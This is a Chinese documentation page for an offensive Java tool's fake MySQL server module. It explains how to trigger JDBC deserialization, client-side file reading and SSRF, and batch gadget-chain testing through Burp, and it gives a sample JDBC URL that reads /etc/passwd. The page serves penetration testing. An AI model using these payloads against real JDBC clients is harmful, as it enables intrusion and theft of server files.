---
title: MySQL JDBC 利用
sidebar_position: 4
---

# MySQL JDBC 利用

## FakeMySQLPayload

MySQL JDBC 反序列化利用姿势

FakeMySQL 模块和 [JNDI 模块](jndi.md) 很像，该模块可实现 MySQL JDBC 反序列化的利用

JNDI 是通过 LDAP/RMI 参数进行传递 token，从而匹配后端并返回对应 Payload

而 FakeMySQL 是通过 mysql username 进行传参数

同时也具有和JNDI模块中一样的容错机制，即: 匹配不到 token 则默认返回最新生成的 Payload

## FakeMySQLReadPayload

MySQL JDBC 客户端文件读取、SSRF 姿势

这里支持两个传参方式，第一种是在 java chains 输入参数，然后返回一个 token，把该放入 jdbc payload 中

![](@site/static/doc/mysql-read.png)

```
jdbc:mysql://127.0.0.1:3308/test?user=[TOKEN]
```

第二种传参方式是在 username 中设置参数，格式为：`fileread_[file name]`

其中 fileread_ 是固定前缀，后缀跟要读取的文件名，例如下面 JDBC 读取文件 Payload

```
jdbc:mysql://127.0.0.1:3308/test?user=fileread_/etc/passwd
```

## FakeMySQLSHPayload

FakeMySQL 反序列化梭哈链，一键测试常规反序列化链，提高测试效率

![](@site/static/doc/mysql-showhand.png)

可放入到 Burp 中进行批量爆破测试
![](@site/static/doc/fake-mysql.png)

总体使用流程等同于 JNDI 的梭哈链，可进行参考: [JNDIShowHandPayload](./jndi.md#jndishowhandpayload)

## 参考

- https://github.com/4ra1n/mysql-fake-server